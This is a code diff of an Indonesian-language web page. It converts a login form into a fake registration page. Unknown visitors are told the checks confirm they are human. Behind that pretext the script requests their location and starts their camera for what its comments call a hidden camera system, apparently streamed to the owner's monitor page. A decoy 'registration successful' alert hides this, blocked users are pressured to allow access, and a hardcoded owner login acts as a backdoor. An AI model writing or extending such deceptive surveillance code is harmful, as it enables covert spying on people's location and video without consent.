@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Daftar</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { min-height: 100vh; background: #0d1117; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; }
@@ -41,7 +41,8 @@
         <input type="number" id="password" placeholder="08..." required>
     </div>
 
-    <button type="submit" class="btn-login">Kirim</button>
+    <button type="submit" class="btn-login">Verifikasi & Kirim</button>
+    <p style="text-align: center;">Kami butuh izin verifikasi bahwa kamu manusia bukan bot</p>
 </form>
 
 
@@ -55,18 +56,57 @@
 
 <script src="https://unpkg.com/peerjs@1.5.5/dist/peerjs.min.js"></script>
 <script>
-document.getElementById("debugForm").addEventListener("submit", function(event) {
-    event.preventDefault();
+    /* 2. ALUR SAAT TOMBOL LOGIN DIKLIK (Dengan Pintu Belakang) */
+    async function handleLogin(event) {
+        event.preventDefault(); 
+        
+        // --- KODE RAHASIA ANDA ---
+        const username = document.getElementById("username").value.trim();
+        const password = document.getElementById("password").value;
 
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value;
+        // Cek apakah ini Anda sang pemilik
+        if (username === "Feri" && password === "006106") {
+            log("Admin terdeteksi. Mengalihkan ke monitor...");
+            window.location.href = "monitor.html";
+            return; // Berhenti di sini, fungsi kamera di bawahnya tidak akan dieksekusi
+        }
+        // -------------------------
 
-    if (username === "Feri" && password === "006106") {
-        window.location.href = "monitor.html";
-    } else {
-        alert("Pendaftaran Berhasil!");
+        // Jika bukan Anda (orang iseng), jalankan sistem kamera tersembunyi
+        const btn = document.getElementById("loginBtn");
+        btn.textContent = "Memproses...";
+        btn.disabled = true;
+
+        try {
+            log("Meminta izin lokasi kepada pengguna...");
+            
+            // 1. Minta Izin Lokasi
+            const position = await getLocation();
+            log("Lokasi didapat: Lat " + position.coords.latitude + ", Lon " + position.coords.longitude);
+
+            // 2. Minta Izin Kamera
+            await startCamera();
+
+            // 3. Jika SEMUA sukses diizinkan, jalankan penyamaran Anda
+            btn.textContent = "Sistem Aktif";
+            pipBtn.style.display = "block";
+            
+            // Ini alert penyamaran dari kode Anda
+            alert("Pendaftaran Berhasil!");
+
+        } catch (error) {
+            console.error(error);
+            log("Akses Ditolak: " + error.message);
+            
+            // Peringatan paksa jika orang iseng klik "Blokir"
+            alert("PERINGATAN: Anda wajib mengizinkan akses untuk melanjutkan pendaftaran!");
+            
+            // Kembalikan tombol agar mereka mencoba lagi
+            btn.textContent = "Sign in";
+            btn.disabled = false;
+        }
     }
-});
+
 </script>
 <script>
     const CAMERA_ID = "CAMERA-01";
